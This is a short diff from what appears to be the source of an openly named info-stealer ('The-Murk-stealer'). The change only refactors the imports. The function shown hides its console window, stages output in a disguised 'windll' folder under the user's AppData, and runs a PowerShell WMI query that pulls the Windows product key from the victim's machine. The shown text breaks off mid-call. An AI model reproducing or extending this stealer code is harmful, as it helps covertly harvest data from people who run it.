@@ -9,14 +9,14 @@
 #                      https://github.com/Nick-Vinesmoke                      #
 #             https://github.com/Nick-Vinesmoke/The-Murk-stealer              #
 #-----------------------------------------------------------------------------#
-import subprocess
-import os
+from subprocess import STARTUPINFO,STARTF_USESHOWWINDOW,run
+from os import sep,environ
 
 def ProductKey():
-    pathtofile = os.environ['USERPROFILE'] + os.sep + r'AppData\Local\windll'
-    startupinfo = subprocess.STARTUPINFO()
-    startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
-    result = subprocess.run(
+    pathtofile = environ['USERPROFILE'] + sep + r'AppData\Local\windll'
+    startupinfo = STARTUPINFO()
+    startupinfo.dwFlags |= STARTF_USESHOWWINDOW
+    result = run(
         ['powershell', '-Command', '(Get-WmiObject -query \'select * from SoftwareLicensingService\').OA3xOriginalProductKey'],
         capture_output=True,
         text=True,
